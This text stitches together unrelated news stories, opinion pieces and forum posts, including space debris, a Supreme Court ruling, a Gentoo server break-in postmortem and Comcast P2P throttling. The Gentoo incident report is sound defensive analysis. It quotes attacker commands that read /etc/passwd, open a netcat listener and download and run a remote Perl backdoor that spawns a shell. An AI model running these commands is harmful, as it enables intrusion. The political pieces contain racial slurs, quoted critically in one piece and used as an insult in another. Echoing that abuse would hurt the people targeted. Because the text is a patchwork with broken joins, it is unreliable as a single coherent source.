In China , he said , " the decision process is still so opaque that maybe they did n't know who to talk to .
Maybe you have a disconnect between the engineers and the people who think about policy . "
China , experts note , has 39 satellites of its own -- many of them now facing a heightened risk of destruction .
Politically , the situation is delicate .
In recent years China has played a growing international role in fighting the proliferation of space junk .
In 2002 , for instance , it joined with other space - faring nations to suggest voluntary guidelines for debris control .
In April , Beijing is to play host to the annual meeting of the advocacy group , known as the Inter - Agency Space Debris Coordination Committee .
Donald Kessler , a former head of the orbital debris program at NASA and a pioneer analyst of the space threat , said Chinese officials at the forum would probably feel " some embarrassment . "
Kessler said Western analysts agreed that China 's new satellite fragments would speed the chain reaction 's onset .
" If the Chinese did n't do the test , it would still happen , " he said .
" It just would n't happen as quickly . "
Last week in Beijing , a foreign ministry spokeswoman failed to respond directly to a debris question .
Asked if the satellite 's remains would threaten other spacecraft , she asserted that China 's policy was to keep space free of weapons .
" We are ready to strengthen international cooperation in this regard , " the spokeswoman , Jiang Yu , told reporters .
Cascade warnings began as early as 1978 .
Kessler and his NASA colleague , Burton Cour - Palais , wrote in the Journal of Geophysical Research that speeding junk that formed more junk would produce " an exponential increase in the number of objects with time , creating a belt of debris around the Earth . "
During the Cold War , Moscow and Washington generally ignored the danger and , from 1968 to 1986 , conducted more than 20 tests of anti-satellite arms that created clouds of jagged scraps .
Often , they did so at low altitudes from which the resulting debris soon plunged earthward .
Still , the number of objects grew as more nations launched rockets and satellites into orbit .
In 1995 , as the count passed 8,000 , the National Academy of Sciences warned in a thick report that some crowded orbits appeared to have already reached the " critical density " needed to sustain a chain reaction .
A year later , apprehension rose as the fuel tank of an abandoned American rocket engine exploded , breaking the craft into 713 detectable fragments -- until now , the record .
Amid such developments , space experts identified the first collisions that threatened to start a chain reaction , putting analysts increasingly on edge .
On Jan. 17 , 2005 , for instance , a piece of speeding debris from an exploded Chinese rocket collided with a derelict American rocket body that had been shot into space 31 years earlier .
Warily , investigators searched though orbital neighborhoods but found to their relief that the crackup had produced only four pieces of detectable debris .
A year later , Johnson , the chief scientist for NASA 's orbital debris program , and his colleague J.C. Liou , published an article in the journal Science that detailed the growing threat .
They said orbits were now so cluttered that the chain reaction was sure to start even if space - faring nations refrained from launching any more spacecraft .
" The environment is unstable , " they wrote , " and collisions will become the most dominant debris - generating mechanism . "
It was in this atmosphere of rising tension that China last month fired a rocket into space that shattered an old weather satellite -- its first successful test of an anti-satellite weapon .
David Wright , a senior scientist at the Union of Concerned Scientists , a private group in Cambridge , Mass. , calculated that the old satellite had broken into 1,000 fragments 4 inches wide or larger , and millions of smaller ones .
Federal sky - watchers who catalog objects in the Earth orbit work slowly and deliberately .
As of Monday , they publicly listed 647 detectable pieces of the satellite but were said to be tracking hundreds more .
The breakup was dangerous because the satellite 's orbit was relatively high , some 530 miles up .
That means the debris will remain in space for tens , thousands or even millions of years .
Kessler , the former NASA official , now a private consultant in Asheville , N.C. , said China might have chosen a relatively high target to avoid directly threatening the International Space Station and its astronaut crew , which orbit at a height of about 220 miles .
" Maybe the choice was to endanger the station in the short term or to cause a long - term problem , " he said .
" Maybe that forced them to raise the orbit . "
Even so , the paths of the speeding Chinese debris , following the laws of physics and of celestial mechanics , expanded in many directions , including upward and downward .
As of last week , outliers from the central cloud stretched from roughly 100 miles to more than 2,000 miles above Earth .
A solution to the cascade threat exists but is costly .
In his Science paper and in recent interviews , Johnson of NASA argued that the only sure answer was environmental remediation , including the removal of existing large objects from orbit .
Robots might install rocket engines to send dead spacecraft careering back into the atmosphere , or ground - based lasers might be used to zap debris .
The bad news , Johnson said in his paper , is that " for the near term , no single remediation technique appears to be both technically feasible and economically viable . "
If nothing is done , a kind of orbital crisis might ensue that is known as the Kessler Syndrome , after Kessler .
A staple of science fiction , it holds that the space around Earth becomes so riddled with junk that launchings are almost impossible .
Vehicles that entered space would quickly be destroyed .
In an interview , Kessler called the worst - case scenario an exaggeration .
" It 's been overdone , " he said of the syndrome .
Still , he warned of an economic barrier to space exploration that could arise .
To fight debris , he said , designers would have to give spacecraft more and more shielding , struggling to protect the craft from destruction and making them heavier and more costly in the process .
At some point , he said , perhaps centuries from now , the costs would outweigh the benefits .
" It gets more and more expensive , " he said .
" Sooner or later , it gets too expensive to do business in space . "

The most infuriating aspect of the current Presidential campaign is the sneaky way in which the media 's talking heads tell the candidates what to talk about .
A prime example of this was the July 8 , 2006 , edition of ABC's Sunday morning coffee clutch " This Week With George Stephanopoulos " in which two dark horse presidential candidates Texas Congressman Ron Paul and former Alaska Sen .
Mike Gravel who are doing well in the primaries were interviewed .
Now Paul and Gravel are two thoughtful and intelligent men who are trying to give primary voters a real alternative to the empty suits pushed by the media .
The two are doing unexpectedly well thanks to strong debate performances and the Internet a medium that gives consumers choice .
The political powers that be are worried about this because Ron and Mike might ruin the presidential chances of their pets like Mitch Romney and Barrack Obama so Georgey Boy has his marching orders : make Ron and Mike look bad .
This is done by controlling the debate the only issue discussed is the war in Iraq to which Gravel and Paul are both passionately opposed .
This gets both men worked up and makes them look like single issue cranks .
The real purpose of these interviews is to make the alternative candidates look like extremist cranks .
Mike Gravel and Ron Paul have lots of interesting ideas but those ideas are not discussed .
Instead the only issue discussed is the war , one on a short list of approved issues the media talks to political candidates about .
Georgie boy asked Mike Gravel about Iraq and his opposition to the Vietnam War which ended over thirty years ago .
He did n't ask Gravel about some of his proposals such as nationwide ballot initiatives similar to those in many states and replacing the income tax with national sales tax eliminating the IRS and tax exemptions ( which would eliminate a lot of opportunities for politicians to shake down business for bribe money ) .
A couple of ideas that would appeal strongly to average voters .
George spent a little more time on Gravel because Gravel is a Democrat who thinks for himself and refuses to go along with the media .
Democratic voters must not be given a real alternative to Clinton II and Uncle Tom Obama because they might take it so any Democrat who leaves the reservation will be destroyed .
The treatment of Ron Paul was a little more polite , but again Georgie was under orders to keep Paul 's libertarian philosophy off of nationwide TV lest it appeal to voters .
So after a few comments about the war Paul was let go .
No effort was made to ask Paul about his stands on things like gun control , drugs and abortion which might appeal to voters .
Instead he too was dismissed as a shallow one issue candidate .
Note : Georgie being a Democratic operative might have been trying to hurt mainstream Republican candidates by making Paul look good here .
" This Week With Propagandist George " is a perfect example of the presidential campaign the media wants to create .
All issues but the war are to be excluded there will be discussion of healthcare , the military industrial complex , Global Warming , Transportation , Energy Policy , taxes , immigration and trade are off the agenda .
Only the war and meaningless issues related to it such as the Scooter Libby affair are to be discussed .
We get the special interests ' dream election , nothing that might offend the corporate money men or spinmeisters who run the parties is to be mentioned .
Unfortunately Ron Paul ( who is raising more money than John McCain ) and Mike Gravel are upsetting the applecart .
By taking advantage of alternative media where voters get a real choice they are attracting attention and votes .
They are also exposing the weakness of the media / political elite , increasingly there is no difference between the media and politicians witness Georgie boy who used to be Bill Clinton 's chief eunuch ( excuse me chief of staff ) now masquerading as a journalist on TV .
The media / political elite is scared to death of Paul and Gravel because they expose the impotence of its pet candidates and their refusal to deal with the nation 's problems .
Not to mention the weakness of the media 's tools of oppression and deception such as daily newspapers and the network news .
Almost nobody is watching network news or paying much attention to the Sunday morning propaganda outlets and newspaper circulation is falling faster than TV news ratings .
People are getting their news from the Internet and Cable TV which give them a real choice and ignoring the talking heads .
The talking heads such as Georgie Boy are trying to justify their existence to their corporate masters so they 're becoming increasingly partisan and nastier .
What comes next ?
My guess is that alternative candidates powered by the internet will do better and better and the media / political elite will take more active efforts to destroy them .
So here 's a prediction , if the talking heads ' censorship of Free Speech in the presidential campaign fails which looks like it will , our self proclaimed leaders will get really nasty .
If Ron Paul , Mike Gravel and other alternative candidates do well the media will start calling them names like child molester , racist , rapist , terrorist sympathizer ( already being deployed against Paul ) , fascist , Nazi , Communist , drug dealer , gay and worse .
Ugly and nasty smears will be spread against these men all over the internet to destroy them and make an example of them as a lesson to any other American who dares try and exert his or her rights in an attempt to give voters a real choice .
If Ron Paul does really well in the Republican primary ( which he might ) do n't be at all surprised if his face shows up on the cover of The National Enquirer next to a headline that says , " Congressman exposed as Child Molester . "
( Remember you heard it here first )
What are average voters to do ?
Keep doing what we are already doing , ignore the media and start using our minds .
Especially when we walk into the voting booth .
This apartment complex , dubbed the The Falls , is to be built in Victoria , Canada .
The aparments will certainly be green on the outside — it features a series of cascading waterfalls and ponds pouring over the building ’s exterior .
In addition to the water , it will feature spacious decks and terraces , some with outdoor gas fireplaces , lush gardens and landscaping .
One of the waterfalls will be 100 feet in height .
However , I doubt that renewable energy is used to pump all that water .
The designers hope to achieve a Silver LEED Certification for the building , which is actually only modestly green — it would have been nice such a verdant building get a Platinum Certification instead !

A narrowly divided Supreme Court ruled Wednesday that imposing the death penalty for the rape of a child is unconstitutional .
In a 5 - 4 decision , the court overturned a Louisiana law that called for the death penalty for raping a child under 12 , and it removed from death row a man convicted of attacking his 8 - year - old stepdaughter .
Justice Anthony M. Kennedy wrote the opinion , saying , in essence , that the crime , awful as it is , does not merit capital punishment .
“ The incongruity between the crime of child rape and the harshness of the death penalty poses risks of over - punishment and counsels against a constitutional ruling that the death penalty can be expanded to include this offense , ” Kennedy wrote .

He was joined by Justices John Paul Stevens , David H. Souter , Ruth Bader Ginsburg and Stephen G. Breyer .
Sen . Barack Obama of Illinois , the presumptive Democratic nominee for president , criticized the court ’s decision at a Chicago news conference .
“ I have said repeatedly that I think that the death penalty should be applied in very narrow circumstances for the most egregious of crimes , ” he said .
“ I think that the rape of a small child , 6 or 8 years old , is a heinous crime , and if a state makes a decision that under narrow , limited , well - defined circumstances , the death penalty is at least potentially applicable , that does not violate our Constitution . ”

Obama has frequently cited the near - abolishment of the death penalty in Illinois as one of his top legislative accomplishments .
His probable Republican opponent in the presidential race , Sen. John McCain of Arizona , also objected .
“ Today ’s Supreme Court ruling is an assault on law enforcement ’s efforts to punish these heinous felons for the most despicable crime , ” McCain said .
“ That there is a judge anywhere in America who does not believe that the rape of a child represents the most heinous of crimes , which is deserving of the most serious of punishments , is profoundly disturbing . ”
The four members of the court ’s conservative wing also sharply criticized the ruling , saying a small but growing number of states had determined that the rape of a child deserved the death penalty ; they said the court majority was interfering with that judgment .

“ The harm that is caused to the victims and to society at large by the worst child rapists is grave , ” Justice Samuel A. Alito Jr. wrote .
“ It is the judgment of the Louisiana lawmakers and those in an increasing number of other states that these harms justify the death penalty . ”
Alito was joined in his dissent by Justices Antonin Scalia and Clarence Thomas and Chief Justice John G. Roberts Jr .
The court in 1977 ruled that the death penalty for rapists was unconstitutional under the 8th Amendment ’s ban on cruel and unusual punishment .
That decision involved the rape of a 16 - year - old female , whom the court considered an adult .
More than a decade ago , Louisiana made rape a capital crime if the victim was younger than 12 .
The state said it has sought the death penalty in only five cases , twice obtaining a capital verdict .
Advertisement
Several other states , including Texas , Georgia and South Carolina , have similar laws , but they require that the assailant have committed a second , separate offense before the death penalty is an option .
The defendant in the case on which the court ruled Wednesday , Patrick Kennedy , has maintained his innocence .
He had been offered life in prison if he pleaded guilty .
He refused and was sentenced to death in 2003 .
He and his stepdaughter originally said that two boys assaulted her in March 1998 in the backyard of their home in Jefferson Parish , across the Mississippi River from New Orleans .
But police found inconsistencies in Kennedy ’s story and blood on sheets inside the home .
The girl was badly injured and required surgery .
Kennedy , 43 , will still face life in prison with no possibility of parole .
His lawyers plan to appeal his conviction .

Many of those killed in the 2006 conflict were women and children
Human Rights Watch said Israel showed " reckless indifference " to the fate of civilians and queried its argument that Hezbollah used them as human shields .
A spokesman for the Israeli government insisted its forces had acted lawfully .
More than 1,125 Lebanese died during the 34 - day conflict , as well as 119 Israeli soldiers and 40 civilians .
Last week , the New - York based group criticised Hezbollah for " indiscriminately and at times deliberately " attacking Israeli civilians .
It also said the Shia movement had failed to take precautions to spare civilians during the conflict when it fired rockets from populated areas and deployed its forces in residential areas .
' Deliberate campaign '
In its 249 - page report , Why They Died : Civilian Casualties in Lebanon during the 2006 War , HRW said it had spent five months investigating the deaths of 510 civilians and 51 fighters .
At least 300 of the deaths investigated were of women and children , the group said .
HRW said a simple movement by a civilian , such as going out to buy bread , was often enough to cause an Israeli air strike , even when there was no evidence of Hezbollah fighters in the vicinity .
Israeli warplanes also targeted many moving vehicles that turned out to be carrying only civilians trying to flee the conflict , it added .
" Hezbollah fighters often did n't carry their weapons in the open or regularly wear military uniforms , which made them a hard target to identify , " HRW executive director Kenneth Roth said .
" But this does n't justify the Israel Defence Force 's failure to distinguish between civilians and combatants , and if in doubt to treat a person as a civilian , as the laws of war require . "

HRW also said the Israeli military repeatedly failed to take into account the presence of civilians when it targeted Hezbollah , despite numerous media reports and Israel 's own experience of past conflicts .
" Israel wrongfully acted as if all civilians had heeded its warnings to evacuate southern Lebanon when it knew they had not , disregarding its continuing legal duty to distinguish between military targets and civilians , " Mr Roth said .
" Issuing warnings does n't make indiscriminate attacks lawful . "
The report also accused Israel of undertaking a deliberate campaign against Hezbollah 's military wing , the Islamic Resistance , but also its political and social welfare institutions .
' Accepted norms '
A spokesman for the Israeli Foreign Ministry , Mark Regev , defended his country 's conduct , saying it had acted lawfully .
" We conform with accepted norms in the conduct of military conflict and we conformed with the accepted norms in the conduct of the rules of war , " he told Reuters .
We conform with accepted norms in the conduct of military conflict and we conformed with the accepted norms in the conduct of the rules of war
Mark Regev
Israeli Foreign Ministry
Mr Regev also disputed HRW 's claim that it could find no evidence - including in videos and photos published by the Israeli military - that Hezbollah fighters had used civilians as " human shields " .
" Hezbollah had a clear pattern of behaviour where it embedded itself among the Lebanese civilian population and exploited it as human shields .
This is not just the Israeli understanding , " he said .
He then cited the UN humanitarian relief co-ordinator , Jan Egeland , who said in July 2006 that the group were unlawfully " shielding themselves close to UN posts and close to the civilian population " .
The war in Lebanon started with a border incursion by Hezbollah , in which eight Israeli soldiers were killed and two others kidnapped , prompting a massive Israeli response .
It 's no secret that doctors , lawyers , traders and senior executives at large corporations typically earn six figures or more .
But where are the $ 100,000 jobs for the rest of us -- the 140 million American workers who lack the inclination , the aptitude or the tolerance for student debt to go for the classic big - money careers ?
It turns out that in the 2000s , there are quite a number of six - figure occupations .
Here are a few worth your consideration :
Technology
Developing nations may graduate more engineers than the United States , but we 've still got enough jobs to keep salaries generous , at least in some specialties .
Electrical engineers earned an average of $ 112,000 in 2005 , according to the Employment Policy Foundation .
Engineering managers earned a median salary of $ 97,000 in 2004 , says the Bureau of Labor Statistics .
" There 's an absolute dearth of talent with three to five years of experience " in interactive specialties such as Web design , information architecture and usability , says Allison Hemming , president of staffing firm Hired Guns .
Senior Web producers can earn $ 85,000 to $ 110,000 .
" Interactive feels very 1999 right now , " Hemming says .
" It 's a real opportunity for people who may have left the field and come back or are just out of college . "
Can production workers approach six figures ?
They can if they 're in the right high tech specialty .
According to Jack Dolmat - Connell , president of compensation consulting firm DolmatConnell & Partners , some semiconductor fab technicians can make up to $ 90,000 with overtime .
Financial Services
Professionals involved in the provision of bread - and - butter financial services �- not just those ensconced on Wall Street -- often earn six figures .
" Producers [ salespeople ] in insurance and branch managers -- those can average $ 120,000 to $ 125,000 , " says Dolmat - Connell .
Real estate may be suffering from an overabundance of new entrants , but long - term prospects for high earnings in pricey markets are still bullish .
" Real estate agent -� that 's one of those quiet little jobs where you can make a boatload of money , " says Bill Coleman , senior vice president for compensation at Salary.com .
An agent who participates in the sale of 12 or 14 half - million - dollar homes per year -- easy to do in big - money markets like the Northeast -- is likely to hit $ 100,000 in commissions .
Entertainment and Hospitality
Can a worker ascend from burger flipper to six - figure earner ?
Not every day , but it happens .
" Restaurant managers can earn $ 100,000 at high - end restaurants and resorts , " says Coleman .
For those who live near a casino , big earnings may be within reach , even without a college education .
" The top 25 percent of casino pit managers earn over $ 100,000 , with just high school and five years of experience , " says Dolmat - Connell .
Security and Hazard Duty
Rent - a - cops generally earn low pay , but well - placed security professionals can do much better .
" Security guards for celebrities can earn six figures , " says Coleman .
These jobs are concentrated in New York and Los Angeles , but sports superstars may have security based in their teams ' hometowns .
Less - glamorous gigs can pay equally well , if work conditions warrant a premium .
Oil rig workers must cope with hazardous and remote work sites , so high - ranking crew members earn up to $ 100,000 .
Government
If you 're a six - figure aspirant , the federal government may be one of the last employers to come to mind .
But Uncle Sam is looking for thousands of professionals at this level each year .
" Retirement rates for midlevel managers are high ; more and more , the government is hiring people from the outside directly into management , " says Kathryn Troutman , Monster 's Federal Career Coach .
And middle - management jobs in government may be better compensated than their private - sector counterparts .
" Midrange professional salaries are much higher , and the flexibility and benefits are much better , " says Troutman .
These jobs generally fall into the GS - 14 and GS - 15 grade levels .
Here are just a few of the federal jobs that can pay $ 100,000 or more , according to USAJOBS :

6/10 Changed Everything Run for your lives - America is under attack !
Just days ago three prisoners at Guantanamo Bay
" Oh but Giblets there are
And that 's just the tip of the iceberg !
Even as we speak the forces of Islamanazism are infiltrating our network of classified Run for your lives - America is under attack !
Just days ago three prisoners at Guantanamo Bay committed suicide in a savage assault on America 's freedom to not care about prisoner suicides !
Oh sure , the " Blame Atrocities First " crowd will tell you these prisoners were " driven to despair , " that they " had no rights , " that they were " held and tortured without due process or judicial oversight in a nightmarish mockery of justice . "
But what they wo n't tell you is that they only committed suicide as part of a diabolical ruse to trick the world into thinking our secret torture camp is the kind of secret torture camp that drives its prisoners to commit suicide !
This fiendish attempt to slander the great American institution of the gulag is nothing less than an act of asymmetrical warfare against the United States - a noose is just a suicide bomb with a very small blast radius , people ! - and when faced with a terrorist attack , America must respond .
Giblets demands immediate retaliatory airstrikes on depressed Muslim torture victims throughout the mideast !
" Oh but Giblets there are dozens of innocent prisoners in Guantanamo " you say because you are a namby - pamby appeasenik who suckles at the teat of terror .
Well if these Guantanamo prisoners are so innocent then what are they doing in Guantanamo ?
Sneaking into our secret military prisons as part of an elaborate plot to make it look like we 're holding them in our secret military prisons , that 's what !
And once they get there they can chain themselves to the floor , break their bones on helpless guards ' fists , and waterboard themselves to their heart 's content to further their sinister Salafi scheme to sully the reputation of secret American torture facilities everywhere !
And that 's just the tip of the iceberg !
Even as we speak the forces of Islamanazism are infiltrating our network of classified CIA prison camps , rendering themselves to third world dictatorships , and launching unprovoked assaults on innocent American bullets !
There 's only one thing to do with all these malicious prisoners , torture victims , and massacred civilians - and that 's to imprison , torture and massacre them before they can mount another attack !
Yes it will be difficult , but these people want to destroy our very way of life - our obliviously violent , guilt - free way of life .
Let 's roll !

Affected Services
Nuthatch hosted a number of non-critical , informative - only web services .
It was not used for any development or distribution services .
A very limited number of developers had access to the machine , and rarely used it .
packages - Browsable index of packages in the Portage tree .
archives - Archives of the Gentoo mailing lists .
packagestest , archivestest - Test installations of packages and archives , for testing new code and features .
scripts - Gentoo Script Repository ( GLEP15 ) , defunct .
kiss - Kernel Advisory Management tool , defunct .
stats - Gentoo Statistics project , defunct .
survey - Gentoo User Survey , defunct .
Raw data
Log of all usages of the exploit : [ 1 ]
Timeline overview
August 1 , 2007
The first user to discover / use the exploit was from 65.81.XXX.XXX , at 01/Aug/2007 15h56 UTC .
He ran uname - a and cat /etc / passwd , then stops , his IP is not seen again .
At 19h36 UTC , the exploit becomes known to a wider group .
Either this or the initial discovery took place at DEFCON .
The next 15 minutes have 18 further usages of the exploit ( two of which bear further examination ) , after which the usage drops extremely rapidly .
There are 7 further attempts on August 1st , the last being at 22h32 UTC .
Including the initial discovery , 9 unique IP addresses have hit the exploit on the first day , 27 total attempts .
13 of these attempts are cat /etc / passwd .
A full breakdown is given at commands.
txt
August 6 , 2007
No further attempts to use the exploit are made until 06 / Aug/2007 21h10 UTC .
The IP used did also hit the exploit on the first day .
It seems like it is demonstrated to somebody else , because 6 minutes later , somebody uses a near identical URL string ( on the seamonkey package ) for the exploit .
( Assumption : the exploit filters through Gentoo at this point .
Nobody else uses it ) .
The Gentoo bug # 187971 is opened for the issue on 07 / Aug/2007 02h59 UTC .
At 03h17 one further unknown attempt to use the exploit is made , running df .
This may have been a Gentoo developer , based on IRC logs of # gentoo - dev at the time .
At 03h20 UTC , Gentoo infra becomes aware of the exploit , and tests it once by running echo EXPLETIVE - DELETED .
Apache on the machine is taken offline .
Initial data capture of relevant memory contents and volatile machine state .
Machine is halted .
Approximately 04h10 UTC marineam happens to be on - hand at OSL , and reboots the machine to a livecd .
MANY thanks to marineam for this insanely good response time , and here 's a plug for the OSL Beer fund kingtaco and robbat2 take an image of the hard drive .
The bug now gets left along for the next several days , as the majority of the infra team is attending ( and later recovering from ) LWE .
August 13 , 2007
Serious analysis on the image begins .
Focus on specific attempts
Two of the attempts bear further commenting .
CODE Attempt 1 nc - l -p 9876
This is blocked by the ingress firewall .
Default DENY rule wins .
CODE Attempt 2 wget - O /var / tmp / foo.pl http://www.regimesyndicate.org/interrupt/foo.pl && perl / var / tmp / foo.pl yourhost listeningport
This had potential .
If the script kiddy that ran this one ( obstensibly from 24.227.XXX.XXX ) actually had even two brain cells to rub together , he could have gotten a lot further .
Instead , he failed in two ways .
Firstly , the backdoor he was trying to fetch was already gone .
It is available elsewhere via Google , and is a trivial perl listener that spawns / bin / sh .
Secondly , he forgot to specify his outgoing destination host and port .
Summary of exploit usage
While Infra is reasonable certain that no attacker successfully executed more than a few harmless commands , the potential remains for the machine to have been seriously exploited .
Partially lucking out
Between the time of the first exploit usage , and the exploit becoming known to Infra , no Gentoo developer logged in with SSH , nor had a long - running shell open .
This means that no user could have had their SSH keys compromised if they had their SSH agent forwarded to the machine .
However , this analysis was needlessly complicated by the fact that Gentoo 's remote logging setup did not seem to be logging all traffic correctly .
If it had been working correctly , a higher degree of certainty , and more information could have been obtained .
Cleanup actions
The following has been undertaken to clean up .
The machine has been wiped for a clean install .
Almost all services have been restored .
The packages code has had the original issue fixed , but remains offline pending a full audit .
All 20 users with local accounts on the machine should change their passwords as a precautionary measure .
Any user that had only an LDAP account was not affected .
General Recommendations
Remote logging of external facing services should be verified regularly .
Consider detailed traffic accounting with a package such as IPaudit ( leave the GUI out ) , to aid later analysis .
Custom code should be reviewed by the security team before wide usage , esp. on critical machines .

Brit Hume called former Senator John Glenn a " partisan --- spearchucker " to describe his role in a Fred Thompson investigation back in his old Senate days on FOX News Sunday .
( via Wikpedia : Glenn also served as the ranking minority member on a special Senate investigative committee chaired by Tennessee senator and actor Fred Dalton Thompson that looked into allegations China attempted to influence U. S. politicians prior to the 1996 elections )
I had to watch it a few times for it to sink in .
I looked up " spearchucker , " on Dictionary.com , but they did n't recognize it so I wonder how he will explain this one away ?
Download Download ( rough transcript )
Hume : ... he had a mixed record in the Senate and he's a man who always seems somewhat frustrated and bored by the Senate ... I particularly remember an investigation that occurred after the Clinton / Dole campaign .
We were new here at FOX news and we carried a lot of the hearings live .
It was in the campaign finance alleged irregularities with monies supposedly seeping into the American political campaign of Bill Clinton from Chinese sources and so on --- it was pretty juicy stuff it looked like a very big deal .
Fred Thompson was the chairman of the Investigating committee and it went absolutely nowhere .
he was effectively buffaloed in that investigation by none other than John Glenn --- who was a wonderful man , but not somebody normally you would think capable of being a real partisan ..ahh... ahh.. spearchucker , who could , who could undo an investigation .
So it did n't go very well and I think Fred Thompson has acknowledged since then that it was n't his finest hour ...
The Urban Dictionary writes :
A derogatory phrase for a black male used in reference to his primitive abilities to hunt animals with a long sharpened object .
More info under the fold :
This is n't the first time a Republican has used a racist term as a description .
Tony Snow used " tar baby , " as the WH press secretary , but later said he would no longer use that phrase .
Mitt Romney used " tar baby " also , but he apologized for it and Cafferty said :
Cafferty :
It ’s comforting to look at guys like Romney and the " tar baby " remark and know that we have such a high quality stable of candidates ready to take over the nation ’s highest office .
What the hell is he thinking - " tar baby ? "
I mean come on
The WSJ's James Taranto wrote this about an article by Sam Fulwood back on May 16 , 2006 :
Slur , Yes Sir !
Sam Fulwood , a Cleveland Plain Dealer columnist , last week wrote this about Colin Powell , the former secretary of state :
Powell rose higher than almost any black Republican by making the party faithful comfortable with his non-threatening and non-demanding presence on racial issues .
Powell flamed out after his ego no longer allowed him to be an unquestioning spearchucker in Mr. Bush 's war .
Fulwood obviously meant to say Powell was a spear - carrier , " a person whose actions are of little significance or value in an event or organization . "
Instead he used a racial slur that likens black men to African savages .
It 's a bit reminiscent of the incident we noted in March , in which a radio host was talking about Condoleezza Rice and said " coon " when he meant " coup . "
But whereas the host apologized immediately and nonetheless was fired on the spot , Fulwood is unrepentant and appears to have drawn only mild criticism from the Plain Dealer ombudsman .

Yarmouth Port , MA 4 edits 2 recommendations funchords MVM Comcast is using Sandvine to manage P2P Connections
WHAT : A device that monitors P2P activity and interferes with requests for the peer within Comcast to UPLOAD data ( downloads appear to be not affected , uploads within Comcast are not affected , transfers already in progress are not affected , and a small percentage of the new transfer requests are still permitted ) ,
WHERE : On the boundaries , at the point where Comcast connects to other points of the Internet ,
WHEN : Earliest evidence is 6 months ago , but use appears to have increased or become more " clamped - down " recently ,
WHY : To reduce costs associated with P2P bandwidth growth
HOW IT WORKS :
- The Sandvine application reads packets that are traversing the network boundary
- If the application senses that outbound P2P traffic is higher than a threshold determined by Comcast , Sandvine begins to interrupt P2P protocol sequences that would initiate a new transfer from within the Comcast network to a peer outside of the Comcast network
- The interruption is accomplished by sending a perfectly forged TCP packet ( correct peer , port , and sequence numbering ) with the RST ( reset ) flag set .
This packet is obeyed by the network stack or operating system which drops the connection .
In eDonkey connections , for example , queued UPLOADS ( to others ) will not be honored to some percentage of non-Comcast P2P users .
Immediately after the peer requests ranges to be transferred , the connection is dropped in the above manner .
Gnutella transfers are similarly affected in the same manner .
In BitTorrent connections , the RST message is sent well after the handshake , and often after some data has been exchanged .
The Sandvine filter interferes during lulls ( NOOP and HAVE commands ) as well as the moment of transition from the ending of sending one complete piece .
When I am not using Comcast , BitTorrent disconnections due to peer resets ( RST flag ) are 3 % .
Using Comcast , 39 % of connections are terminated using the RST flag .
In Summary : The Sandvine filter has taken steps to try to make the filtering experience innocuous ( nearly invisible ) to the user .
Some transfers are allowed , the interruption seems to come from the distant peer , and it relies on the P2P protocol being used to either find another peer ( hopefully a Comcast one ) or retry that peer later .
WHY THIS MAY BE GOOD :
- There is reduced cost , and perhaps higher download and upload speeds for everyone ( regardless of P2P use ) , if P2P data requests can be fulfilled entirely within the Comcast network .
- Because a peer will retry to get a file or a piece of a file , uploads are merely delayed .
The peer may have to return to the back of a queue and go through the above cycle several times before the transfer request is honored .
WHY THIS MAY BE BAD :
- The decision whether to interrupt a transfer is without regard as to whether there are non-Comcast sources for a file .
For example , an amateur band releasing their music on the P2P networks is at a disadvantage .
The time it would take to get a complete copy of a music file to a point outside of the Comcast network is dramatically increased .
- Comcast is not the only customer for Sandvine and the like .
Other ISPs will and have adopted this and similar technologies and tactics .
As they do , the amount of outgoing P2P data that each allows on the wire becomes a competitive element .
- Some P2P networks punish non-sharers .
Upon detecting that files offered for sharing cannot be transferred , the network can reduce access to the peer that cannot transfer .
MY OPINION :
I tried to write the above evenhandedly .
As an enthusiast , I use P2P for an IPTV application , Skype , and to deliver Ubuntu Linux and Shareaza , two open - source applications .
My music is Tin -Pan Alley and I really watch very few movies .
I 'm not the guy that RIAA or the MPAA are looking for : I like old ragtime music , historical film , and old magazines .
But I know the P2P protocols very well I and noticed something was wrong a few months ago .
What cracked the case for me was when I was telling someone in Brazil about the upload resets ( error 10053 ) , and he offered me a VPN connection for comparison .
No drops .
The protocol analyzer told the " RST " of the story .
And yesterday , I learned about Sandvine and got word from another Sandvine customer that they 're bragging about their Comcast deployment in order to make sales .
I am not against this , per se .
They are allowing some P2P sharing to points outside of their network , even though they can detect and prevent it .
I might even be able to live with it , if I knew exactly what to expect and how to override it if it was stupidly hampering something .
( I am convinced it is designed to make P2P prefer Comcast clients when possible , but not designed to hamper communications when there are no alternatives ) .
However :
- I have always paid for unfettered internet access .
No filtering , please .
It was n't filtered when I first signed up , I do n't want it filtered now .
In this case , they are filtering ME !!
- These are being installed silently -- why ?
Why not install them noisily , and provoke action on the makers of P2P applications to seek out peers with lower TTLs ( translation : electrically closer , more likely to be ' in - network ' ) .
- These smart filters are still rather dumb .
After a threshold is reached , the interrupting of new transfer requests is made .
The app does n't know whether or not the transfer is important or unimportant , rare or common .
( And do we really want our ISP deciding what is important and urgent to us ? )
P2P is not illegal .
People are currently downloading more media than they can possibly use in a lifetime -- that fruitless task is a fad that will wear off .
Comcast may have had what they thought was a good idea , here .
But , as implemented , it is having bad effects and puts Comcast in the seat of interfering with my end - to - end client communications .

While I feel your pain , since you are a residential customer ( I am presuming ) , you are bound by the Terms Of Service agreement that was provided to you at time of sign - up and which is easily accessible through their website .
A few key passages :
" We may change our prices , fees , the Services and / or the terms and conditions of this Agreement in the future .
Unless this Agreement or applicable law specifies otherwise , we will give you thirty ( 30 ) days prior Notice of any significant change to this Agreement .
If you find the change unacceptable , you have the right to cancel your Service (s ) .
However , if you continue to receive Service (s ) after the end of the notice period ( the " Effective Date " ) of the change , we will consider that you have accepted the changes .
You may not modify this Agreement by making any typed , handwritten , or any other changes to it for any purpose . "
" 4. CHANGES TO SERVICES
Subject to applicable law , we have the right to change our Services , Comcast Equipment and rates or charges , at any time with or without notice .
We also may rearrange , delete , add to or otherwise change programming or features or offerings contained in the Services , including but not limited to , content , functionality , hours of availability , customer equipment requirements , speed and upstream and downstream rate limitations .
If we do give you notice , it may be provided on your monthly bill , as a bill insert , in a newspaper or other communication permitted under applicable law .
If you find a change in the Service (s ) unacceptable , you have the right to cancel your Service (s ) .
However , if you continue to receive Service (s ) after the change , this will constitute your acceptance of the change .
Please take the time to read any notices of changes to the Service (s ) .
We are not liable for failure to deliver any programming , services , features or offerings except as provided in Section 11e . "
" 7. USE OF SERVICES
You agree that the Services and the Comcast Equipment will be used only by you and the members of your immediate household living with you at the same address and only for personal , residential , non-commercial purposes , unless otherwise specifically authorized by us in writing .
You will not use the Comcast Equipment at any time at an address other than the Premises without our prior written authorization .
You agree and represent that you will not resell or permit another to resell the Services in whole or in part .
